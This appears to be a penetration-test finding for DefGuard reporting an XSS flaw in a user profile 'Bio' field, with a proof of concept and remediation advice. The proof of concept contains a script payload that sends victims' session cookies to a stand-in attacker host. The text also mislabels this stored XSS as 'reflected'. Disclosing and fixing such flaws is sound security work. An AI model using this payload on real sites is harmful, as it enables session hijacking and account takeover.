---
linked_github_issue: DG11-01
title: Possibility of XSS attack leading to account takeover
status: In Progress
severity: High
issue_link: https://github.com/DefGuard/defguard/issues/1516
---

### Technical Details

The vulnerability lies in the user profile page. Specifically, the "Bio" field does not properly sanitize user input. When a user enters malicious JavaScript code (e.g., `<script>alert('XSS');</script>`) into this field, the script is executed by the browser of any user who views that profile page. This is a classic **reflected Cross-Site Scripting (XSS)** vulnerability.

A potential attacker could leverage this to:
* **Steal session cookies:** By injecting a script that sends the user's cookie to an external server, an attacker can hijack the session and gain unauthorized access to the account.
* **Perform actions on behalf of the user:** An attacker can force the victim's browser to send requests to the server, for example, changing the user's password or email address without their consent.

The issue was identified during a routine penetration test.

---

### Proof of Concept

1.  Log in to the application.
2.  Navigate to the user profile settings.
3.  In the "Bio" field, insert the following payload:
    ```html
    <script>
      fetch('[https://attacker.com/log?cookie=](https://attacker.com/log?cookie=)' + btoa(document.cookie));
    </script>
    ```
4.  Save the profile.
5.  When an administrator or any other user views the modified profile, their browser will execute the script, sending their session cookie to the attacker's server.

---

### Recommendations

* **Sanitize user input:** Implement proper server-side input sanitization for all user-facing fields, especially for rich-text areas like the "Bio" field. Use a library that filters out or encodes dangerous HTML tags and characters.
* **Implement a Content Security Policy (CSP):** Configure a robust CSP to mitigate the impact of any potential XSS attacks by restricting which scripts are allowed to be executed on the page.
* **Encode output:** Ensure that any user-generated content displayed on the page is properly HTML-encoded to prevent the browser from interpreting it as executable code.

